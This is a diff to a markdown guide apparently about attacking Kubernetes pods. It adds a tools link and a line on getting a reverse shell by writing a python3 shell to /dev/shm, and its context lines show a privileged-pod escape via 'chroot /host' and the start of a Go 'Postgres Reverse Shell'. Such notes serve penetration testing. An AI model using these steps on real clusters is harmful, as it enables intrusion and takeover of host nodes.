@@ -10,6 +10,7 @@
  - [Introduction to fee](#item-three)
  - [Interacting with postgesql](#item-five)
  - [Playing with kube-api insite a pod with `cluster-admin`](#item-six)
+ - [tools](#item-seven)
  
 ## Synopsis
 
@@ -94,6 +95,10 @@ We can interact with `/dev/shm` for our purposes to execute scripts with python 
 `/dev/shm` will gernally be available for all pods on a Kuberntes work node by `default`.
 
 We can see what version of python is available on the system with `python --version`
+
+---
+We can get a reverse shell by writing the python3 shell in [tools](#item-seven) to /dev/shm
+
 
 ---
 <a id="item-three"></a>
@@ -226,7 +231,7 @@ kubectl run everything-allowed-exec-pod --image=ubuntu --overrides='
 kubectl exec -it <badpod> -- /bin/sh -c 'chroot /host'
 ```
 # Tools
-
+<a id="item-seven"></a>
 ## Postgres Reverse Shell
 ```go
 package main
